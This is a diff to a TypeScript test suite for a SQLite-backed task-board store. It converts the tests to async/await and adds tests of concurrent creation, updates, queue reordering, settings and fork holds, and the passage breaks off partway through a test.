+		expect((await reopened.getTask("seed1"))?.pushRetries).toBe(2);
+		await reopened.close();
 	});
 });
 
 describe("starred flag", () => {
-	test("a fresh task defaults to unstarred and updateTask persists the flag across reopen", () => {
-		const store = open(join(root, "starred"));
-		const task = store.createTask("pin me");
+	test("a fresh task defaults to unstarred and updateTask persists the flag across reopen", async () => {
+		const store = await open(join(root, "starred"));
+		const task = await store.createTask("pin me");
 		expect(task.starred).toBe(false);
-		store.updateTask(task.id, { starred: true });
-		expect(store.getTask(task.id)?.starred).toBe(true);
-		store.close();
-		const reopened = open(join(root, "starred"));
-		expect(reopened.getTask(task.id)?.starred).toBe(true);
-		reopened.close();
+		await store.updateTask(task.id, { starred: true });
+		expect((await store.getTask(task.id))?.starred).toBe(true);
+		await store.close();
+		const reopened = await open(join(root, "starred"));
+		expect((await reopened.getTask(task.id))?.starred).toBe(true);
+		await reopened.close();
 	});
 
-	test("an old database without the starred column gains it with default 0 on open", () => {
+	test("an old database without the starred column gains it with default 0 on open", async () => {
 		const dir = join(root, "starred-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
-		const ref = open(join(root, "starred-schema-ref"));
-		ref.close();
+		const ref = await open(join(root, "starred-schema-ref"));
+		await ref.close();
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
 		db.exec(
 			`ATTACH '${join(root, "starred-schema-ref", ".tasks", "tasks.db")}' AS ref`,
@@ -4832,16 +5121,16 @@ describe("starred flag", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		const seed = store.getTask("seed1");
+		const store = await open(dir);
+		const seed = await store.getTask("seed1");
 		expect(seed?.title).toBe("old card");
 		expect(seed?.starred).toBe(false);
-		store.close();
+		await store.close();
 	});
 });
 
 describe("hold provider columns", () => {
-	test("open backfills hold_provider and hold_window on a pre-existing database and they round-trip", () => {
+	test("open backfills hold_provider and hold_window on a pre-existing database and they round-trip", async () => {
 		const dir = join(root, "legacy-hold-provider");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -4854,35 +5143,35 @@ describe("hold provider columns", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at, hold_until) VALUES ('old1', 'held', 'p', 'todo', 'queued', 1, 1, 5000)",
 		);
 		db.close();
-		const store = open(dir);
+		const store = await open(dir);
 		// The old row converges: the columns exist and read null (owner unknown).
-		const old = store.getTask("old1");
+		const old = await store.getTask("old1");
 		expect(old?.holdUntil).toBe(5000);
 		expect(old?.holdProvider).toBeNull();
 		expect(old?.holdWindow).toBeNull();
-		const task = store.createTask("held for zai");
+		const task = await store.createTask("held for zai");
 		expect(task.holdProvider).toBeNull();
 		expect(task.holdWindow).toBeNull();
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			holdUntil: 1_000,
 			holdProvider: "zai",
 			holdWindow: "7d",
 		});
-		const round = store.getTask(task.id);
+		const round = await store.getTask(task.id);
 		expect(round?.holdUntil).toBe(1_000);
 		expect(round?.holdProvider).toBe("zai");
 		expect(round?.holdWindow).toBe("7d");
 		// Clearing a hold clears its owner in the same write.
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			holdUntil: null,
 			holdProvider: null,
 			holdWindow: null,
 		});
-		const cleared = store.getTask(task.id);
+		const cleared = await store.getTask(task.id);
 		expect(cleared?.holdUntil).toBeNull();
 		expect(cleared?.holdProvider).toBeNull();
 		expect(cleared?.holdWindow).toBeNull();
-		store.close();
+		await store.close();
 	});
 
 	test("open backfills hold_attempts and hold_set_at on a pre-existing database and they round-trip", () => {
@@ -4916,7 +5205,7 @@ describe("hold provider columns", () => {
 });
 
 describe("turn log offset", () => {
-	test("open adds log_offset to a database created before it", () => {
+	test("open adds log_offset to a database created before it", async () => {
 		const dir = join(root, "log-offset-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const legacy = new Database(join(dir, ".tasks", "tasks.db"), {
@@ -4927,13 +5216,13 @@ describe("turn log offset", () => {
 			"CREATE TABLE turns (id INTEGER PRIMARY KEY AUTOINCREMENT, task_id TEXT NOT NULL, kind TEXT NOT NULL, prompt TEXT NOT NULL, input TEXT, input_by TEXT, started_at INTEGER NOT NULL, ended_at INTEGER, pid INTEGER, exit_code INTEGER, outcome TEXT, summary TEXT, details TEXT, question TEXT, error TEXT, model TEXT, layer TEXT, ran_on TEXT)",
 		);
 		legacy.close();
-		const store = open(dir);
-		const task = store.createTask("legacy offset");
+		const store = await open(dir);
+		const task = await store.createTask("legacy offset");
 		// The offset path runs against the freshly added column without throwing.
-		const turn = store.startTurn(task.id, "work", "p", null);
+		const turn = await store.startTurn(task.id, "work", "p", null);
 		expect(turn.logOffset).toBeNull();
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
-		store.close();
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const cols = raw
 			.query<{ name: string; notnull: number }, []>("PRAGMA table_info(turns)")
@@ -4944,12 +5233,12 @@ describe("turn log offset", () => {
 		expect(cols[0]?.notnull).toBe(0);
 	});
 
-	test("startTurn stores the passed offset and the default stays null", () => {
-		const store = open(join(root, "turn-log-offset-basic"));
-		const task = store.createTask("offset things");
-		const plain = store.startTurn(task.id, "work", "p", null);
+	test("startTurn stores the passed offset and the default stays null", async () => {
+		const store = await open(join(root, "turn-log-offset-basic"));
+		const task = await store.createTask("offset things");
+		const plain = await store.startTurn(task.id, "work", "p", null);
 		expect(plain.logOffset).toBeNull();
-		const placed = store.startTurn(
+		const placed = await store.startTurn(
 			task.id,
 			"work",
 			"p",
@@ -4962,11 +5251,11 @@ describe("turn log offset", () => {
 		);
 		expect(placed.logOffset).toBe(42);
 		// The read-back row carries it: a fresh list sees the stored offset too.
-		expect(store.listTurns(task.id).map((t) => t.logOffset)).toEqual([
+		expect((await store.listTurns(task.id)).map((t) => t.logOffset)).toEqual([
 			null,
 			42,
 		]);
-		store.close();
+		await store.close();
 	});
 });
 
@@ -5016,7 +5305,7 @@ describe("review findings storage", () => {
 		security: null,
 	});
 
-	test("open converges an old-schema database: rows survive, review_findings exists, findingsCheckedAt is null", () => {
+	test("open converges an old-schema database: rows survive, review_findings exists, findingsCheckedAt is null", async () => {
 		const dir = join(root, "review-findings-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -5026,14 +5315,14 @@ describe("review findings storage", () => {
 		);
 		db.close();
 
-		const store = open(dir);
+		const store = await open(dir);
 		// The seeded row survives the migration.
-		expect(store.getTask("seed1")?.title).toBe("seeded review");
-		expect(store.getTask("seed1")?.state).toBe("running");
+		expect((await store.getTask("seed1"))?.title).toBe("seeded review");
+		expect((await store.getTask("seed1"))?.state).toBe("running");
 		// The migrated column exists and maps to a null stamp.
-		expect(store.getTask("seed1")?.findingsCheckedAt).toBeNull();
+		expect((await store.getTask("seed1"))?.findingsCheckedAt).toBeNull();
 		// The new table accepts rows.
-		store.close();
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		raw.exec(
 			"INSERT INTO review_findings (card_id, prompt, model, rank, security, created_at) VALUES ('seed1', 'Needs validation: suspicious retry loop', 'zai/glm-5.3-flash', 3, NULL, 1)",
@@ -5048,65 +5337,67 @@ describe("review findings storage", () => {
 		raw.close();
 	});
 
-	test("appendReviewFinding stores findings and listReviewFindings returns them in arrival order", () => {
+	test("appendReviewFinding stores findings and listReviewFindings returns them in arrival order", async () => {
 		const dir = join(root, "review-findings-roundtrip");
-		const store = open(dir);
-		const card = store.createTask("review card");
-		store.updateTask(card.id, { stage: "in_progress" });
+		const store = await open(dir);
+		const card = await store.createTask("review card");
+		await store.updateTask(card.id, { stage: "in_progress" });
 
 		const first = finding("Needs validation: flaky session replay");
 		const second = finding("Unchecked error path in applyEvent");
-		expect(store.appendReviewFinding(card.id, first)).toBe(true);
-		expect(store.appendReviewFinding(card.id, second)).toBe(true);
+		expect(await store.appendReviewFinding(card.id, first)).toBe(true);
+		expect(await store.appendReviewFinding(card.id, second)).toBe(true);
 
-		expect(store.listReviewFindings(card.id)).toEqual([first, second]);
+		expect(await store.listReviewFindings(card.id)).toEqual([first, second]);
 		// Another card sees none of them.
-		const other = store.createTask("other card");
-		expect(store.listReviewFindings(other.id)).toEqual([]);
-		store.close();
+		const other = await store.createTask("other card");
+		expect(await store.listReviewFindings(other.id)).toEqual([]);
+		await store.close();
 	});
 
-	test("a duplicate prompt stores once, returns false, and does not reset a set findingsCheckedAt", () => {
+	test("a duplicate prompt stores once, returns false, and does not reset a set findingsCheckedAt", async () => {
 		const dir = join(root, "review-findings-duplicate");
-		const store = open(dir);
-		const card = store.createTask("review card");
-		store.updateTask(card.id, { stage: "in_progress" });
+		const store = await open(dir);
+		const card = await store.createTask("review card");
+		await store.updateTask(card.id, { stage: "in_progress" });
 
 		const findingText = "Needs validation: retry swallows errors";
-		expect(store.appendReviewFinding(card.id, finding(findingText))).toBe(true);
-		store.updateTask(card.id, { findingsCheckedAt: Date.now() });
-		expect(store.getTask(card.id)?.findingsCheckedAt).not.toBeNull();
+		expect(await store.appendReviewFinding(card.id, finding(findingText))).toBe(
+			true,
+		);
+		await store.updateTask(card.id, { findingsCheckedAt: Date.now() });
+		expect((await store.getTask(card.id))?.findingsCheckedAt).not.toBeNull();
 
 		// The duplicate is rejected and leaves the stamp alone.
-		expect(store.appendReviewFinding(card.id, finding(findingText))).toBe(
+		expect(await store.appendReviewFinding(card.id, finding(findingText))).toBe(
 			false,
 		);
-		expect(store.listReviewFindings(card.id)).toHaveLength(1);
-		expect(store.getTask(card.id)?.findingsCheckedAt).not.toBeNull();
-		store.close();
+		expect(await store.listReviewFindings(card.id)).toHaveLength(1);
+		expect((await store.getTask(card.id))?.findingsCheckedAt).not.toBeNull();
+		await store.close();
 	});
 
-	test("a new finding resets a set findingsCheckedAt to null", () => {
+	test("a new finding resets a set findingsCheckedAt to null", async () => {
 		const dir = join(root, "review-findings-stamp-reset");
-		const store = open(dir);
-		const card = store.createTask("review card");
-		store.updateTask(card.id, { stage: "in_progress" });
+		const store = await open(dir);
+		const card = await store.createTask("review card");
+		await store.updateTask(card.id, { stage: "in_progress" });
 
-		store.appendReviewFinding(
+		await store.appendReviewFinding(
 			card.id,
 			finding("Needs validation: lost report"),
 		);
-		store.updateTask(card.id, { findingsCheckedAt: Date.now() });
-		expect(store.getTask(card.id)?.findingsCheckedAt).not.toBeNull();
+		await store.updateTask(card.id, { findingsCheckedAt: Date.now() });
+		expect((await store.getTask(card.id))?.findingsCheckedAt).not.toBeNull();
 
 		expect(
-			store.appendReviewFinding(
+			await store.appendReviewFinding(
 				card.id,
 				finding("Confirmed: unbounded workpool queue"),
 			),
 		).toBe(true);
-		expect(store.getTask(card.id)?.findingsCheckedAt).toBeNull();
-		store.close();
+		expect((await store.getTask(card.id))?.findingsCheckedAt).toBeNull();
+		await store.close();
 	});
 });
 
@@ -5115,21 +5406,24 @@ describe("jira imports", () => {
 	const items = (...keys: string[]) =>
 		keys.map((key) => ({ key, title: `${key}: t`, prompt: `prompt ${key}` }));
 
-	test("settings default to null and round-trip", () => {
-		const store = open(join(root, "jira-settings"));
-		const s = store.getSettings();
+	test("settings default to null and round-trip", async () => {
+		const store = await open(join(root, "jira-settings"));
+		const s = await store.getSettings();
 		expect(s.jiraConnection).toBeNull();
 		expect(s.jiraLastJql).toBeNull();
-		store.setSettings({ jiraConnection: "acme", jiraLastJql: "project = X" });
-		store.close();
-		const again = open(join(root, "jira-settings")).getSettings();
+		await store.setSettings({
+			jiraConnection: "acme",
+			jiraLastJql: "project = X",
+		});
+		await store.close();
+		const again = await (await open(join(root, "jira-settings"))).getSettings();
 		expect(again.jiraConnection).toBe("acme");
 		expect(again.jiraLastJql).toBe("project = X");
 	});
 
-	test("files backlog cards idle and todo cards queued", () => {
-		const store = open(join(root, "jira-file"));
-		const r = store.fileJiraCards({
+	test("files backlog cards idle and todo cards queued", async () => {
+		const store = await open(join(root, "jira-file"));
+		const r = await store.fileJiraCards({
 			site,
 			stage: "backlog",
 			items: items("A-1", "A-2", "A-3"),
@@ -5137,7 +5431,7 @@ describe("jira imports", () => {
 		});
 		expect(r.skipped).toEqual([]);
 		expect(r.filed).toHaveLength(3);
-		r.filed.forEach((t, i) => {
+		for (const [i, t] of r.filed.entries()) {
 			expect(t).toMatchObject({
 				stage: "backlog",
 				state: "idle",
@@ -5146,9 +5440,9 @@ describe("jira imports", () => {
 				title: `A-${i + 1}: t`,
 				prompt: `prompt A-${i + 1}`,
 			});
-			expect(store.getTask(t.id)?.stage).toBe("backlog");
-		});
-		const todo = store.fileJiraCards({
+			expect((await store.getTask(t.id))?.stage).toBe("backlog");
+		}
+		const todo = await store.fileJiraCards({
 			site,
 			stage: "todo",
 			items: items("B-1"),
@@ -5159,7 +5453,7 @@ describe("jira imports", () => {
 			state: "queued",
 			topic: "jira",
 		});
-		expect(store.jiraImported(site, ["A-1", "B-1", "Z-9"])).toEqual(
+		expect(await store.jiraImported(site, ["A-1", "B-1", "Z-9"])).toEqual(
 			new Map([
 				["A-1", r.filed[0]?.id ?? ""],
 				["B-1", todo.filed[0]?.id ?? ""],
@@ -5167,24 +5461,24 @@ describe("jira imports", () => {
 		);
 	});
 
-	test("a second import of the same site and keys skips them; another site does not", () => {
-		const store = open(join(root, "jira-dup"));
-		store.fileJiraCards({
+	test("a second import of the same site and keys skips them; another site does not", async () => {
+		const store = await open(join(root, "jira-dup"));
+		await store.fileJiraCards({
 			site,
 			stage: "backlog",
 			items: items("A-1", "A-2"),
 			now: 1,
 		});
-		const before = store.listTasks().length;
-		const again = store.fileJiraCards({
+		const before = (await store.listTasks()).length;
+		const again = await store.fileJiraCards({
 			site,
 			stage: "backlog",
 			items: items("A-1", "A-2", "A-1"),
 			now: 2,
 		});
 		expect(again).toEqual({ filed: [], skipped: ["A-1", "A-2", "A-1"] });
-		expect(store.listTasks()).toHaveLength(before);
-		const other = store.fileJiraCards({
+		expect(await store.listTasks()).toHaveLength(before);
+		const other = await store.fileJiraCards({
 			site: "https://jira.corp",
 			stage: "backlog",
 			items: items("A-1"),
@@ -5194,9 +5488,9 @@ describe("jira imports", () => {
 		expect(other.skipped).toEqual([]);
 	});
 
-	test("a key repeated in one call files one card", () => {
-		const store = open(join(root, "jira-repeat"));
-		const r = store.fileJiraCards({
+	test("a key repeated in one call files one card", async () => {
+		const store = await open(join(root, "jira-repeat"));
+		const r = await store.fileJiraCards({
 			site,
 			stage: "backlog",
 			items: items("A-1", "A-1"),
@@ -5206,40 +5500,50 @@ describe("jira imports", () => {
 		expect(r.skipped).toEqual(["A-1"]);
 	});
 
-	test("a cancelled card still counts as imported", () => {
-		const store = open(join(root, "jira-cancel"));
-		const [card] = store.fileJiraCards({
-			site,
-			stage: "backlog",
-			items: items("A-1"),
-			now: 1,
-		}).filed;
+	test("a cancelled card still counts as imported", async () => {
+		const store = await open(join(root, "jira-cancel"));
+		const [card] = (
+			await store.fileJiraCards({
+				site,
+				stage: "backlog",
+				items: items("A-1"),
+				now: 1,
+			})
+		).filed;
 		if (!card) throw new Error("no card");
-		store.updateTask(card.id, { cancelledAt: 5 });
-		expect(store.jiraImported(site, ["A-1"]).get("A-1")).toBe(card.id);
+		await store.updateTask(card.id, { cancelledAt: 5 });
+		expect((await store.jiraImported(site, ["A-1"])).get("A-1")).toBe(card.id);
 		expect(
-			store.fileJiraCards({ site, stage: "todo", items: items("A-1"), now: 2 })
-				.skipped,
+			(
+				await store.fileJiraCards({
+					site,
+					stage: "todo",
+					items: items("A-1"),
+					now: 2,
+				})
+			).skipped,
 		).toEqual(["A-1"]);
 	});
 
-	test("a key whose task row is gone imports again", () => {
+	test("a key whose task row is gone imports again", async () => {
 		const dir = join(root, "jira-gone");
-		let store = open(dir);
-		const [card] = store.fileJiraCards({
-			site,
-			stage: "backlog",
-			items: items("A-1"),
-			now: 1,
-		}).filed;
+		let store = await open(dir);
+		const [card] = (
+			await store.fileJiraCards({
+				site,
+				stage: "backlog",
+				items: items("A-1"),
+				now: 1,
+			})
+		).filed;
 		if (!card) throw new Error("no card");
-		store.close();
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		raw.run("DELETE FROM tasks WHERE id = ?", [card.id]);
 		raw.close();
-		store = open(dir);
-		expect(store.jiraImported(site, ["A-1"]).size).toBe(0);
-		const again = store.fileJiraCards({
+		store = await open(dir);
+		expect((await store.jiraImported(site, ["A-1"])).size).toBe(0);
+		const again = await store.fileJiraCards({
 			site,
 			stage: "backlog",
 			items: items("A-1"),
@@ -5247,12 +5551,12 @@ describe("jira imports", () => {
 		});
 		expect(again.filed).toHaveLength(1);
 		expect(again.filed[0]?.id).not.toBe(card.id);
-		expect(store.jiraImported(site, ["A-1"]).get("A-1")).toBe(
+		expect((await store.jiraImported(site, ["A-1"])).get("A-1")).toBe(
 			again.filed[0]?.id ?? "",
 		);
 	});
 
-	test("an old database gains the jira_imports table on open", () => {
+	test("an old database gains the jira_imports table on open", async () => {
 		const dir = join(root, "jira-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const old = new Database(join(dir, ".tasks", "tasks.db"), { create: true });
@@ -5260,16 +5564,18 @@ describe("jira imports", () => {
 			"CREATE TABLE settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)",
 		);
 		old.close();
-		const store = open(dir);
+		const store = await open(dir);
 		expect(
-			store.fileJiraCards({
-				site,
-				stage: "backlog",
-				items: items("A-1"),
-				now: 1,
-			}).filed,
+			(
+				await store.fileJiraCards({
+					site,
+					stage: "backlog",
+					items: items("A-1"),
+					now: 1,
+				})
+			).filed,
 		).toHaveLength(1);
-		store.close();
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const t = raw
 			.query<{ name: string }, []>(
@@ -5282,11 +5588,11 @@ describe("jira imports", () => {
 });
 
 describe("gate column", () => {
-	test("a fresh database carries the gate column via TASKS_DDL", () => {
-		const store = open(join(root, "gate-fresh"));
-		const task = store.createTask("gated");
+	test("a fresh database carries the gate column via TASKS_DDL", async () => {
+		const store = await open(join(root, "gate-fresh"));
+		const task = await store.createTask("gated");
 		expect(task.gate).toBeNull();
-		store.updateTask(task.id, {
+		await store.updateTask(task.id, {
 			gate: {
 				hash: "abc",
 				seen: null,
@@ -5295,7 +5601,7 @@ describe("gate column", () => {
 				parked: true,
 			},
 		});
-		expect(store.getTask(task.id)?.gate).toEqual({
+		expect((await store.getTask(task.id))?.gate).toEqual({
 			hash: "abc",
 			seen: null,
 			fails: 1,
@@ -5303,14 +5609,14 @@ describe("gate column", () => {
 			parked: true,
 		});
 		// undefined keeps the stored value; null clears it.
-		store.updateTask(task.id, { title: "renamed" });
-		expect(store.getTask(task.id)?.gate?.hash).toBe("abc");
-		store.updateTask(task.id, { gate: null });
-		expect(store.getTask(task.id)?.gate).toBeNull();
-		store.close();
+		await store.updateTask(task.id, { title: "renamed" });
+		expect((await store.getTask(task.id))?.gate?.hash).toBe("abc");
+		await store.updateTask(task.id, { gate: null });
+		expect((await store.getTask(task.id))?.gate).toBeNull();
+		await store.close();
 	});
 
-	test("an old-schema database without the gate column converges on open", () => {
+	test("an old-schema database without the gate column converges on open", async () => {
 		const dir = join(root, "gate-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -5356,19 +5662,19 @@ describe("gate column", () => {
 		);
 		db.close();
 
-		const store = open(dir);
+		const store = await open(dir);
 		// The seeded row survives and reads a null gate; a write lands in the new column.
-		const seeded = store.getTask("seed1") as Task;
+		const seeded = (await store.getTask("seed1")) as Task;
 		expect(seeded.gate).toBeNull();
-		store.updateTask("seed1", {
+		await store.updateTask("seed1", {
 			gate: { hash: null, seen: null, fails: 0, sig: null, parked: false },
 		});
-		expect(store.getTask("seed1")?.gate?.parked).toBe(false);
-		store.close();
+		expect((await store.getTask("seed1"))?.gate?.parked).toBe(false);
+		await store.close();
 		// Reopening is idempotent: the ALTER no longer fires on a converged database.
-		const again = open(dir);
-		expect(again.getTask("seed1")?.gate?.parked).toBe(false);
-		again.close();
+		const again = await open(dir);
+		expect((await again.getTask("seed1"))?.gate?.parked).toBe(false);
+		await again.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const cols = raw
 			.query<{ name: string }, []>(
@@ -5422,7 +5728,7 @@ describe("prompt author column", () => {
 		revision INTEGER NOT NULL DEFAULT 1
 	)`;
 
-	test("an old-schema database backfills rows to 'user' on open and round-trips board authorship", () => {
+	test("an old-schema database backfills rows to 'user' on open and round-trips board authorship", async () => {
 		const dir = join(root, "prompt-author-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -5432,33 +5738,862 @@ describe("prompt author column", () => {
 		);
 		db.close();
 
-		const store = open(dir);
+		const store = await open(dir);
 		// The seeded row survives and backfills to the user default.
-		expect(store.getTask("seed1")?.promptAuthor).toBe("user");
+		expect((await store.getTask("seed1"))?.promptAuthor).toBe("user");
 		// New cards start as user-authored; a board write lands in the added column.
-		const card = store.createTask("board filed this");
+		const card = await store.createTask("board filed this");
 		expect(card.promptAuthor).toBe("user");
-		store.updateTask(card.id, { promptAuthor: "board" });
-		expect(store.getTask(card.id)?.promptAuthor).toBe("board");
-		store.close();
+		await store.updateTask(card.id, { promptAuthor: "board" });
+		expect((await store.getTask(card.id))?.promptAuthor).toBe("board");
+		await store.close();
 		// The board value persists across a reopen.
-		const reopened = open(dir);
-		expect(reopened.getTask(card.id)?.promptAuthor).toBe("board");
+		const reopened = await open(dir);
+		expect((await reopened.getTask(card.id))?.promptAuthor).toBe("board");
 		// A user edit makes the prompt user-authored again.
-		reopened.editTask(card.id, "user rewrote this");
-		expect(reopened.getTask(card.id)?.promptAuthor).toBe("user");
-		reopened.close();
+		await reopened.editTask(card.id, "user rewrote this");
+		expect((await reopened.getTask(card.id))?.promptAuthor).toBe("user");
+		await reopened.close();
 	});
 
-	test("an old-schema database with no rows opens without error", () => {
+	test("an old-schema database with no rows opens without error", async () => {
 		const dir = join(root, "prompt-author-migration-empty");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
 		db.exec(PRE_AUTHOR_TASKS_DDL);
 		db.close();
 
-		const store = open(dir);
-		expect(store.listTasks()).toEqual([]);
-		store.close();
+		const store = await open(dir);
+		expect(await store.listTasks()).toEqual([]);
+		await store.close();
+	});
+});
+
+describe("async store serial operations", () => {
+	test("concurrent creation preserves IDs, rows, and adjacent lifecycle events", async () => {
+		const store = await open(join(root, "async-create"));
+		await store.setSettings({ taskIdPrefix: "ASYNC" });
+		const cards = await Promise.all([
+			...Array.from({ length: 12 }, (_, i) => store.createTask(`card ${i}`)),
+			...Array.from({ length: 3 }, () =>
+				store.createTask("explicit", null, "work", "same-id"),
+			),
+		]);
+		expect(cards.map((card) => card.id)).toEqual([
+			...Array.from({ length: 12 }, (_, i) => `ASYNC-${i + 1}`),
+			"same-id",
+			"same-id-2",
+			"same-id-3",
+		]);
+		expect(new Set(cards.map((card) => card.id)).size).toBe(15);
+		for (const card of cards) {
+			expect(await store.getTask(card.id)).toEqual(card);
+		}
+		const events = await store.events();
+		expect(
+			events.map((event) => [
+				event.kind,
+				event.taskId,
+				event.from,
+				event.to,
+				event.detail,
+			]),
+		).toEqual(
+			cards.flatMap((card) => [
+				["create", card.id, null, "todo", null],
+				["state", card.id, null, "queued", null],
+			]),
+		);
+		expect((await store.createTask("next")).id).toBe("ASYNC-13");
+	});
+
+	test("concurrent guarded updates return the winner and emit no conflict events", async () => {
+		const store = await open(join(root, "async-revisions"));
+		const card = await store.createTask("original");
+		const results = await Promise.all([
+			store.updateTaskIfCurrent(
+				card.id,
+				{
+					prompt: "winner",
+					stage: "in_progress",
+					state: "running",
+				},
+				card.revision,
+			),
+			store.updateTaskIfCurrent(
+				card.id,
+				{
+					prompt: "loser",
+					stage: "backlog",
+					state: "idle",
+				},
+				card.revision,
+			),
+		]);
+		expect(results.map((result) => result.ok)).toEqual([true, false]);
+		expect(results[0]?.task).toEqual(results[1]?.task);
+		expect(await store.getTask(card.id)).toMatchObject({
+			prompt: "winner",
+			stage: "in_progress",
+			state: "running",
+			revision: card.revision + 1,
+		});
+		expect(
+			(await store.events()).map((event) => [event.kind, event.from, event.to]),
+		).toEqual([
+			["create", null, "todo"],
+			["state", null, "queued"],
+			["stage", "todo", "in_progress"],
+			["state", "queued", "running"],
+		]);
+		const internal = await Promise.all([
+			store.updateTask(card.id, { state: "needs_you" }),
+			store.updateTask(card.id, { state: "idle" }),
+		]);
+		expect(internal.map((task) => [task.revision, task.state])).toEqual([
+			[3, "needs_you"],
+			[4, "idle"],
+		]);
+		expect(
+			(await store.events())
+				.slice(-2)
+				.map((event) => [event.kind, event.from, event.to]),
+		).toEqual([
+			["state", "running", "needs_you"],
+			["state", "needs_you", "idle"],
+		]);
+	});
+
+	test("concurrent prompt edits and holds preserve revision guards", async () => {
+		const store = await open(join(root, "async-edit-hold"));
+		const card = await store.createTask("original");
+		const [edit, hold] = await Promise.all([
+			store.editTask(card.id, "new title\nnew body", card.revision),
+			store.claimPromptHold(card.id, 12345, card.revision),
+		]);
+		expect(edit.ok).toBe(true);
+		expect(hold.ok).toBe(false);
+		expect(hold.task).toEqual(edit.task);
+		expect(await store.getTask(card.id)).toMatchObject({
+			title: "new title",
+			prompt: "new title\nnew body",
+			revision: 2,
+			holdUntil: null,
+		});
+		const [claimed, released] = await Promise.all([
+			store.claimPromptHold(card.id, 23456, 2),
+			store.releasePromptHold(card.id),
+		]);
+		expect(claimed.ok).toBe(true);
+		expect(released).toBeUndefined();
+		expect(await store.getTask(card.id)).toMatchObject({
+			revision: 2,
+			holdUntil: null,
+			holdProvider: null,
+			holdWindow: null,
+		});
+		expect(await store.events()).toHaveLength(2);
+	});
+
+	test("concurrent queue permutations expose only complete orders", async () => {
+		const store = await open(join(root, "async-queue"));
+		const cards = await Promise.all(
+			["a", "b", "c"].map((p) => store.createTask(p)),
+		);
+		const [a, b, c] = cards.map((card) => card.id) as [string, string, string];
+		const events = await store.events();
+		const [first, firstOrder, second, secondOrder, invalid, lastOrder] =
+			await Promise.all([
+				store.reorderQueue([c, a, b]),
+				store.queueIds(),
+				store.reorderQueue([b, c, a]),
+				store.queueIds(),
+				store.reorderQueue([a, a, c]),
+				store.queueIds(),
+			]);
+		expect(first).toBe(true);
+		expect(firstOrder).toEqual([c, a, b]);
+		expect(second).toBe(true);
+		expect(secondOrder).toEqual([b, c, a]);
+		expect(invalid).toBe(false);
+		expect(lastOrder).toEqual([b, c, a]);
+		for (const card of cards) {
+			expect((await store.getTask(card.id))?.revision).toBe(card.revision + 2);
+		}
+		expect(await store.events()).toEqual(events);
+	});
+
+	test("concurrent settings patches preserve complete snapshots and disjoint keys", async () => {
+		const store = await open(join(root, "async-settings"));
+		const [first, snapshot, second] = await Promise.all([
+			store.setSettings({
+				displayName: "first",
+				releaseCommand: "first command",
+			}),
+			store.getSettings(),
+			store.setSettings({ displayName: "second", maxParallel: 7 }),
+		]);
+		expect(first).toMatchObject({
+			displayName: "first",
+			releaseCommand: "first command",
+			maxParallel: null,
+		});
+		expect(snapshot).toEqual(first);
+		expect(second).toMatchObject({
+			displayName: "second",
+			releaseCommand: "first command",
+			maxParallel: 7,
+		});
+		expect(await store.getSettings()).toEqual(second);
+		expect(await store.events()).toEqual([]);
+	});
+
+	test("concurrent fork hold replacements and cleanup expose complete branch sets", async () => {
+		const store = await open(join(root, "async-fork-holds"));
+		for (const forkId of [1, 2]) {
+			await store.saveForkBranch({
+				forkId,
+				branchHash: "branch",
+				branch: "main",
+				head: "head",
+				analyzedHead: null,
+				firstPendingAt: 1,
+				lastRunAt: null,
+				lastError: null,
+				retries: 0,
+			});
+		}
+		const firstRows = [
+			{ sha: "a".repeat(40), pr: 1, prHead: "b".repeat(40), released: false },
+			{ sha: "c".repeat(40), pr: 2, prHead: "d".repeat(40), released: true },
+		];
+		const secondRows = [
+			{ sha: "e".repeat(40), pr: 3, prHead: "f".repeat(40), released: true },
+		];
+		await store.setForkHolds(2, "branch", secondRows);
+		const [, firstSnapshot, , secondSnapshot, , branches, holds] =
+			await Promise.all([
+				store.setForkHolds(1, "branch", firstRows),
+				store.listForkHolds(1),
+				store.setForkHolds(1, "branch", secondRows),
+				store.listForkHolds(1),
+				store.deleteForkBranchesNotIn([2]),
+				store.listAllForkBranches(),
+				store.listForkHolds(1),
+			]);
+		expect(firstSnapshot).toEqual(
+			firstRows.map((row) => ({
+				...row,
+				forkId: 1,
+				branchHash: "branch",
+				released: row.released ? 1 : 0,
+			})),
+		);
+		expect(secondSnapshot).toEqual(
+			secondRows.map((row) => ({
+				...row,
+				forkId: 1,
+				branchHash: "branch",
+				released: 1,
+			})),
+		);
+		expect(branches.map((branch) => branch.forkId)).toEqual([2]);
+		expect(holds).toEqual([]);
+		expect(await store.listForkHolds(2)).toHaveLength(1);
+		expect(await store.events()).toEqual([]);
+	});
+
+	test("concurrent fork results keep children, cursor changes, and consumed holds together", async () => {
+		const store = await open(join(root, "async-fork-results"));
+		for (const forkId of [1, 2]) {
+			await store.saveForkBranch({
+				forkId,
+				branchHash: "branch",
+				branch: "main",
+				head: `head-${forkId}`,
+				analyzedHead: null,
+				firstPendingAt: 1,
+				lastRunAt: null,
+				lastError: "retry",
+				retries: 2,
+			});
+			await store.setForkHolds(forkId, "branch", [
+				{
+					sha: "a".repeat(40),
